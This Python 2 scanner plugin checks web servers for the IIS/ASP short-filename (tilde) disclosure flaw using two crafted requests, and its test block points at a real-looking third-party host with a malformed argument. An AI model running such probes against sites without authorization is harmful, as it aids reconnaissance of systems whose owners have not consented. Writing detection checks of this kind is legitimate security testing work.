#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urlparse
from ..miniCurl import Curl
from ..t  import T

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False
        if 'asp' in head:
            url = arg
            code, head, res, errcode, _ = curl.curl(url + '%2F*~1.*%2Fx.aspx')
#	    存在短文件名泄漏漏洞就会出现404页面
            if code == 404:
                code, head, res, errcode, _ = curl.curl(url + '%2Fabcd*~1.*%2Fx.aspx')
#		输入不存在的字母，ooxx则会出现400错误
                if code == 400:
                    output(url,result,'warning')
        del curl
        return result


def output(url,result,label):
    info = url + ' short file info '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='asp short file info'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/http/www_7b2f2e712d947a7ad946d1d754f62c7a.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_7b2f2e712d947a7ad946d1d754f62c7a.py
#/root/github/poccreate/codesrc/exp-52.py
